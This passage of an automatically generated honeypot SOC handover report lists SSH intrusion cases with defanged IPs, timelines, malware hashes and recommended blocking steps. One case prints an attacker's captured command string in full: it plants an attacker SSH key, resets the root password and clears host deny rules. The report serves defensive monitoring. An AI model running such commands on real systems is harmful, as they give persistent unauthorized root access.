| `2026-05-31 22:33:45` | `cowrie.login.success` |
| `2026-05-31 22:33:46` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `172.172.170[.]199` to AbuseIPDB if not already reported
- [ ] Block `172.172.170[.]199` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b369b28b114f

| Field | Detail |
|---|---|
| **Source IP** | `5.104.84[.]188` |
| **First Seen** | 2026-05-31 22:49 |
| **Last Seen** | 2026-05-31 22:49 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-31 22:49:19` | `cowrie.session.connect` |
| `2026-05-31 22:49:19` | `cowrie.client.version` |
| `2026-05-31 22:49:19` | `cowrie.client.kex` |
| `2026-05-31 22:49:19` | `cowrie.login.success` |
| `2026-05-31 22:49:19` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `5.104.84[.]188` to AbuseIPDB if not already reported
- [ ] Block `5.104.84[.]188` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-60ca3b22b412

| Field | Detail |
|---|---|
| **Source IP** | `14.103.84[.]145` |
| **First Seen** | 2026-05-31 23:02 |
| **Last Seen** | 2026-05-31 23:02 |
| **Session Duration** | 36s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~, cat /proc/cpuinfo | grep name | wc -l, echo "root:U12TwCoKtNR9"|chpasswd|bash, rm -rf /tmp/secure.sh; rm -rf /tmp/auth.sh; pkill -9 secure.sh; pkill -9 auth.sh; echo > /etc/hosts.deny; pkill -9 sleep;` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2, 01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW), 01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1053.003 · T1057 · T1059.004 · T1078 · T1083 · T1105 · T1489 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-31 23:02:13` | `cowrie.session.connect` |
| `2026-05-31 23:02:13` | `cowrie.client.version` |
| `2026-05-31 23:02:13` | `cowrie.client.kex` |
| `2026-05-31 23:02:14` | `cowrie.login.success` |
| `2026-05-31 23:02:14` | `cowrie.session.params` |
| `2026-05-31 23:02:14` | `cowrie.command.input` |
| `2026-05-31 23:02:14` | `cowrie.command.failed` |
| `2026-05-31 23:02:14` | `cowrie.log.closed` |
| `2026-05-31 23:02:15` | `cowrie.session.params` |
| `2026-05-31 23:02:15` | `cowrie.command.input` |
| `2026-05-31 23:02:15` | `cowrie.session.file_download` |
| `2026-05-31 23:02:15` | `cowrie.log.closed` |
| `2026-05-31 23:02:43` | `cowrie.session.params` |
| `2026-05-31 23:02:43` | `cowrie.command.input` |
| `2026-05-31 23:02:43` | `cowrie.log.closed` |
| `2026-05-31 23:02:43` | `cowrie.session.params` |
| `2026-05-31 23:02:43` | `cowrie.command.input` |
| `2026-05-31 23:02:44` | `cowrie.log.closed` |
| `2026-05-31 23:02:44` | `cowrie.session.params` |
| `2026-05-31 23:02:44` | `cowrie.command.input` |
| `2026-05-31 23:02:44` | `cowrie.session.file_download` |
| `2026-05-31 23:02:44` | `cowrie.log.closed` |
| `2026-05-31 23:02:44` | `cowrie.session.params` |
| `2026-05-31 23:02:44` | `cowrie.command.input` |
| `2026-05-31 23:02:45` | `cowrie.log.closed` |
| `2026-05-31 23:02:45` | `cowrie.session.params` |
| `2026-05-31 23:02:45` | `cowrie.command.input` |
| `2026-05-31 23:02:45` | `cowrie.log.closed` |
| `2026-05-31 23:02:45` | `cowrie.session.params` |
| `2026-05-31 23:02:45` | `cowrie.command.input` |
| `2026-05-31 23:02:45` | `cowrie.command.input` |
| `2026-05-31 23:02:46` | `cowrie.log.closed` |
| `2026-05-31 23:02:46` | `cowrie.session.params` |
| `2026-05-31 23:02:46` | `cowrie.command.input` |
| `2026-05-31 23:02:46` | `cowrie.log.closed` |
| `2026-05-31 23:02:46` | `cowrie.session.params` |
| `2026-05-31 23:02:46` | `cowrie.command.input` |
| `2026-05-31 23:02:46` | `cowrie.log.closed` |
| `2026-05-31 23:02:47` | `cowrie.session.params` |
| `2026-05-31 23:02:47` | `cowrie.command.input` |
| `2026-05-31 23:02:47` | `cowrie.log.closed` |
| `2026-05-31 23:02:47` | `cowrie.session.params` |
| `2026-05-31 23:02:47` | `cowrie.command.input` |
| `2026-05-31 23:02:47` | `cowrie.log.closed` |
| `2026-05-31 23:02:47` | `cowrie.session.params` |
| `2026-05-31 23:02:47` | `cowrie.command.input` |
| `2026-05-31 23:02:48` | `cowrie.log.closed` |
| `2026-05-31 23:02:48` | `cowrie.session.params` |
| `2026-05-31 23:02:48` | `cowrie.command.input` |
| `2026-05-31 23:02:48` | `cowrie.log.closed` |
| `2026-05-31 23:02:48` | `cowrie.session.params` |
| `2026-05-31 23:02:48` | `cowrie.command.input` |
| `2026-05-31 23:02:49` | `cowrie.log.closed` |
| `2026-05-31 23:02:49` | `cowrie.session.params` |
| `2026-05-31 23:02:49` | `cowrie.command.input` |
| `2026-05-31 23:02:49` | `cowrie.log.closed` |
| `2026-05-31 23:02:49` | `cowrie.session.params` |
| `2026-05-31 23:02:49` | `cowrie.command.input` |
| `2026-05-31 23:02:50` | `cowrie.log.closed` |
| `2026-05-31 23:02:50` | `cowrie.session.params` |
| `2026-05-31 23:02:50` | `cowrie.command.input` |
| `2026-05-31 23:02:50` | `cowrie.log.closed` |
| `2026-05-31 23:02:50` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `14.103.84[.]145` to AbuseIPDB if not already reported
- [ ] Block `14.103.84[.]145` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

---

## 📡 Reconnaissance Activity — Grouped by Source IP

> Repeated connect/close sessions with no auth success, commands, or downloads.
> Grouped within a 120-minute window per IP to reduce noise.

| IP | Sessions | First Seen | Last Seen | Duration | Login Attempts | TTPs | Severity |
|---|---|---|---|---|---|---|---|
| `159.203.20[.]239` | **47** | 2026-05-31 21:04 | 2026-05-31 23:02 | 21m | 0 | `T1592` | 🟠 MEDIUM |
| `206.135.174[.]103` | **25** | 2026-05-31 22:07 | 2026-05-31 22:13 | 5m | 0 | `T1592` | 🟠 MEDIUM |
| `46.70.206[.]6` | **10** | 2026-05-31 22:11 | 2026-05-31 22:31 | 0m | 10 | `T1110.001 · T1592` | 🟠 MEDIUM |
| `85.159.4[.]32` | **10** | 2026-05-31 21:21 | 2026-05-31 21:34 | 0m | 10 | `T1110.001 · T1592` | 🟠 MEDIUM |
| `89.252.131[.]17` | **10** | 2026-05-31 22:14 | 2026-05-31 22:31 | 0m | 10 | `T1110.001 · T1592` | 🟠 MEDIUM |
| `14.103.84[.]145` | **2** | 2026-05-31 23:02 | 2026-05-31 23:02 | 0m | 0 | `T1592` | 🟢 LOW |
| `5.104.84[.]188` | **2** | 2026-05-31 22:48 | 2026-05-31 22:48 | 0m | 2 | `T1110.001 · T1592` | 🟢 LOW |
| `5.181.87[.]35` | **2** | 2026-05-31 21:43 | 2026-05-31 21:51 | 0m | 2 | `T1110.001 · T1592` | 🟢 LOW |
| `106.13.180[.]139` | 1 | 2026-05-31 21:40 | 2026-05-31 21:42 | 120s | 0 | `T1592` | 🟢 LOW |
| `113.201.65[.]26` | 1 | 2026-05-31 21:41 | 2026-05-31 21:43 | 120s | 0 | `T1592` | 🟢 LOW |
| `115.190.52[.]153` | 1 | 2026-05-31 22:35 | 2026-05-31 22:37 | 120s | 0 | `T1592` | 🟢 LOW |
| `124.43.4[.]17` | 1 | 2026-05-31 22:25 | 2026-05-31 22:27 | 120s | 0 | `T1592` | 🟢 LOW |
| `139.19.117[.]130` | 1 | 2026-05-31 22:43 | 2026-05-31 22:44 | 10s | 2 | `T1110.001 · T1592` | 🟢 LOW |
| `172.172.170[.]199` | 1 | 2026-05-31 22:33 | 2026-05-31 22:33 | 8s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `183.82.111[.]224` | 1 | 2026-05-31 22:30 | 2026-05-31 22:30 | 1s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `185.226.196[.]17` | 1 | 2026-05-31 21:23 | 2026-05-31 21:23 | 0s | 0 | `T1592` | 🟢 LOW |
| `185.226.196[.]19` | 1 | 2026-05-31 21:23 | 2026-05-31 21:23 | 5s | 0 | `T1592` | 🟢 LOW |
| `185.226.196[.]20` | 1 | 2026-05-31 21:23 | 2026-05-31 21:23 | 5s | 0 | `T1592` | 🟢 LOW |
| `27.128.171[.]39` | 1 | 2026-05-31 22:24 | 2026-05-31 22:26 | 120s | 0 | `T1592` | 🟢 LOW |
| `58.221.60[.]25` | 1 | 2026-05-31 22:27 | 2026-05-31 22:29 | 120s | 0 | `T1592` | 🟢 LOW |
| `59.126.16[.]66` | 1 | 2026-05-31 21:33 | 2026-05-31 21:33 | 30s | 0 | `T1592` | 🟢 LOW |
| `84.201.243[.]44` | 1 | 2026-05-31 22:59 | 2026-05-31 22:59 | 2s | 1 | `T1110.001 · T1592` | 🟢 LOW |

---

## 🦠 Malware Analysis Results (28 sample(s))

| File | Type | SHA-256 (short) | Threat Score | Severity | VT Detections |
|---|---|---|---|---|---|
| `01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b` | Unknown binary | `01ba4719c80b6fe9...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `12de77bef9500e41c76a2200bc6fa712e7e3fc188dfdd92a764a22c3421b7208` | ELF Binary (Linux executable) (x86-64 64-bit) | `12de77bef9500e41...` | 45/100 | 🟡 MEDIUM | **38/75** 🔴 |
| `17b7944a9b8a4e3edb1b1f2e743ae5d06dae0a8c3a9531e94970aa3261c2cab5` | ELF Binary (Linux executable) (x86-64 64-bit) | `17b7944a9b8a4e3e...` | 45/100 | 🟡 MEDIUM | **38/76** 🔴 |
| `20260429-011658-3f1992b60e9d-0-redir__root_a6s87d6as8zdgtdyas_ini` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260430-003018-0cc07f4bf950-0-redir__dev_watchdog` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `2495e33392ef58d29cef5077b77c6c9164ad3f4cfb2c433b344df7e674542664` | Unknown binary | `2495e33392ef58d2...` | 0/100 | 🟢 LOW | Not in VT |
| `2b78990584d601289f89026783af9871061dc18c4e52a49d0b4caad6a7d3143a` | ELF Binary (Linux executable) (MIPS 32-bit) | `2b78990584d60128...` | 30/100 | 🟢 LOW | Not in VT |
| `38ef0580d99fb1524c13f8dc4981fe2757deb290b29f947ebc24b4b359756f63` | ELF Binary (Linux executable) (x86-64 64-bit) | `38ef0580d99fb152...` | 44/100 | 🟡 MEDIUM | **37/75** 🔴 |
| `6b3a55e0261b0304143f805a24924d0c1c44524821305f31d9277843b8a10f4e` | Unknown binary | `6b3a55e0261b0304...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `72ce5b00ca4bfa0c18fcdf03a15e5391a85d81300783626598fe7e022e0ec538` | ELF Binary (Linux executable) (x86-64 64-bit) | `72ce5b00ca4bfa0c...` | 45/100 | 🟡 MEDIUM | **39/75** 🔴 |
| `776c0fccae481c384f5636903ce500fae22803cf8778ec9a029956bb85a68010` | ELF Binary (Linux executable) (x86-64 64-bit) | `776c0fccae481c38...` | 44/100 | 🟡 MEDIUM | **35/74** 🔴 |
| `77c2e7968f7695c1bfbe08f0c455cc95479a74cc7fdb432667e29bab08515ce1` | ELF Binary (Linux executable) (ARM 32-bit) | `77c2e7968f7695c1...` | 30/100 | 🟢 LOW | Not in VT |
| `7a9da7d10aa80b0f9e2e3f9e518030c86026a636e0b6de35905e15dd4c8e3e2d` | ELF Binary (Linux executable) (x86-64 64-bit) | `7a9da7d10aa80b0f...` | 45/100 | 🟡 MEDIUM | **38/75** 🔴 |
| `8daf92f0870c58ece8b68a3057c3ab6e8477215f853c54cdfe790acf1141161d` | ELF Binary (Linux executable) (ARM 32-bit) | `8daf92f0870c58ec...` | 45/100 | 🟡 MEDIUM | **38/74** 🔴 |
| `98babd858ec296d43844c96d53ff8713c44a451ba6e05b89d64c772828a0514d` | ELF Binary (Linux executable) (x86-64 64-bit) | `98babd858ec296d4...` | 44/100 | 🟡 MEDIUM | **37/75** 🔴 |
| `9a45029b646e2d20015695b5541f5fb76eace740bf329dc05af8ea53bd89619c` | Unknown binary | `9a45029b646e2d20...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `a04ac6d98ad989312783d4fe3456c53730b212c79a426fb215708b6c6daa3de3` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 50/100 | 🟡 MEDIUM | **51/75** 🔴 |
| `a2812d2ca38cf4e519e386901fb89c393d891417a168a278bbb9b9d4f38145cc` | ELF Binary (Linux executable) (x86-64 64-bit) | `a2812d2ca38cf4e5...` | 44/100 | 🟡 MEDIUM | **35/74** 🔴 |
| `a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2` | Unknown binary | `a8460f446be54041...` | 13/100 | 🟢 LOW | **33/75** 🔴 |
| `db2b1183a337cdf116ec3158067f70502e4534b6c27dd3a984c0bacb030732d5` | ELF Binary (Linux executable) (x86-64 64-bit) | `db2b1183a337cdf1...` | 43/100 | 🟡 MEDIUM | **34/75** 🔴 |
| `e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `e99df510c24950e447f6a471be7fb1b1f7716b0e882005db3511327cbc27b9ff` | ELF Binary (Linux executable) (ARM 32-bit) | `e99df510c24950e4...` | 30/100 | 🟢 LOW | 0/72 ✅ |
| `f200744b6900aeb0a27df08c71fc28a7f07b0aee21e844beca214eb8c4ab58dd` | ELF Binary (Linux executable) (x86-64 64-bit) | `f200744b6900aeb0...` | 44/100 | 🟡 MEDIUM | **36/75** 🔴 |
| `tmp3v3avwej` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `tmp41sthfqu` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 50/100 | 🟡 MEDIUM | **51/75** 🔴 |
| `tmpjyzmzmsu` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 50/100 | 🟡 MEDIUM | **51/75** 🔴 |
| `tmpw4ocpnlc` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 50/100 | 🟡 MEDIUM | **51/75** 🔴 |
| `tmpzmvvpi6d` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 50/100 | 🟡 MEDIUM | **51/75** 🔴 |

---

## 🌐 Top Attacker IPs by Abuse Score

| IP | Country | ISP | Abuse Score | OTX Pulses |
|---|---|---|---|---|
| `113.201.65[.]26` | CN | China Unicom Shannxi Province Network | **100** ⚠️ | 8 |
| `115.190.52[.]153` | CN | Beijing Volcano Engine Technology Co., Ltd. | **100** ⚠️ | 9 |
| `206.135.174[.]103` | PK | Cyber Internet Services (Pvt.) Ltd. | **100** ⚠️ | 3 |
| `124.43.4[.]17` | LK | Internet Service Provider in Sri Lanka. | **100** ⚠️ | 38 |
| `5.181.87[.]35` | TR | Pitline Ltd | **100** ⚠️ | 50 |
| `84.201.243[.]44` | RU | JSC ER-Telecom Holding Izhevsk branch | **100** ⚠️ | 50 |
| `106.13.180[.]139` | CN | Beijing Baidu Netcom Science and Technology Co., Ltd. | **100** ⚠️ | 5 |
| `59.126.16[.]66` | TW | Chunghwa Telecom Data Communication Business Group | **100** ⚠️ | 50 |
| `85.159.4[.]32` | UA | PRIVATE JOINT STOCK COMPANY DATAGROUP | **100** ⚠️ | 19 |
| `139.19.117[.]130` | DE | Max-Planck-Institut fuer Informatik | **100** ⚠️ | 50 |

---

## 🎯 Top TTPs Observed (MITRE ATT&CK)

| TTP ID | Count |
|---|---|
| [T1592](https://attack.mitre.org/techniques/T1592) | 75 |
| [T1110.001](https://attack.mitre.org/techniques/T1110/001) | 38 |
| [T1078](https://attack.mitre.org/techniques/T1078) | 31 |
| [T1105](https://attack.mitre.org/techniques/T1105) | 16 |
| [T1021.004](https://attack.mitre.org/techniques/T1021/004) | 15 |

---

## 🔕 False Positive Summary (1 filtered)

| Reason | Count |
|---|---|
| AbuseIPDB score 0 below threshold 25 | 1 |

> FP threshold: AbuseIPDB score < 25. Known scanner ISPs auto-filtered.

---

## ⚙️ Pipeline Health

| Tool | Role | Status |
|---|---|---|
| Tool 05  | Network Monitor (port 2222) | ✅ HEALTHY |
| Tool 26  | Incident Timeline Generator | ✅ 154 cases |
| Tool 34  | Credential Extractor        | ✅ 70 attempts |
| Tool 35  | SSH Fingerprint Aggregator  | ✅ 5 fingerprints |
| Tool 36  | Command Clustering          | ✅ 3 clusters |
| Tool 27  | Threat Intel Feeder         | ✅ 24 IPs enriched |
| Tool 29  | False Positive Tracker      | ✅ 1 filtered (0.7%) |
| Tool 30  | Metric Exporter             | ✅ stats.json written |
| Tool 30b | ASN Clustering              | ✅ 20 ASNs |
| Tool 31  | Malware Analyzer            | ✅ 28 files |
| Tool 33  | YARA Classifier             | ✅ 8 classified |
| Tool 28  | SOC Handover Report         | ✅ This report (v2.2) |

> **Report grouping:** 31 priority case(s) shown individually · 22 recon entry/entries in table (8 group(s) consolidating 108 session(s)).

---

## 📋 Standing Orders for Next Shift

- [ ] Verify honeypot is HEALTHY (Tool 05 green)
- [ ] Review any new HIGH/CRITICAL priority cases above
- [ ] Check AbuseIPDB for newly reported IPs from this shift
- [ ] If Cowrie captures a download, verify Tool 31 ran and check malware section
- [ ] Integrity baseline auto-recreates every 2 hours via pipeline

---

_Generated by THIR · Tool 28 v2.3 · SOC Handover Report Generator_  
_Pipeline: `nikhilsalunkemumbai/thir-live` · Cowrie SSH Honeypot · AWS EC2_  
_Report time: 2026-05-31T23:04:04Z_
